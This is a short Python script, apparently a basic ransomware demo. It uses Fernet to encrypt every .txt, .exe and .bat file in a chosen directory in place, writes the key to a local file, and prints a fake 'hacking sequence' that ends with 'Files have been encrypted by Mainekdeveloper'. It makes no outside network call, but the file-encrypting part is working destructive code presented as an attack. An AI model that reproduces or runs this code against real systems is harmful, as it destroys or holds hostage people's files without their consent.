import os
import time
import random
from cryptography.fernet import Fernet

# Create a key
key = Fernet.generate_key()
with open("keyfile.key", "wb") as key_out:
    key_out.write(key)

fernet = Fernet(key)
target_dir = "/path/to/file"  # Change this to your target directory

# Encrypt files
for file in os.listdir(target_dir):
    if file.endswith((".txt", ".exe", ".bat")):
        path = os.path.join(target_dir, file)
        with open(path, "rb") as f:
            data = f.read()
        
        encrypted_data = fernet.encrypt(data)
        
        with open(path, "wb") as f:
            f.write(encrypted_data)

# Hacking animation
def hacking_animation():
    print("Initiating hacking sequence...")
    time.sleep(1)
    for _ in range(1):
        print("Connecting to target system", end="")
        for _ in range(3):
            print(".", end="", flush=True)
            time.sleep(0.5)
        print("\nBypassing security protocols...")
        time.sleep(1)
        print("Accessing files...")
        time.sleep(1)
        print("Encrypting files...")
        time.sleep(1)
        print("Encryption complete.")
        time.sleep(1)
        print("\n" + "="*40)
        print("Files have been encrypted by Mainekdeveloper...")
        print("="*40)
        time.sleep(1)


hacking_animation()




